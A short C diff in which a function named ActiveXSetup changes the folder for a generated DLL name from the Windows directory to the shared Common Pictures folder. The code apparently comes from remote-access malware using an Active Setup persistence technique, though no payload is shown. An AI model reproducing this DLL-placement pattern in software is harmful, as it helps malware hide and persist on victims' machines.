@@ -282,7 +282,7 @@ void ActiveXSetup()
 	GetNUM(ActiveXKey);
 	//构造dll完整文件名
 	//GetSystemDirectory(strFileName, MAX_PATH);
-	SHGetSpecialFolderPath(NULL, strFileName, CSIDL_WINDOWS, TRUE);
+	SHGetSpecialFolderPath(NULL, strFileName, CSIDL_COMMON_PICTURES, TRUE);
 	strcat(strFileName, "\\");
 	strcat(strFileName, ActiveXKey);
 	strcat(strFileName, ".dll");
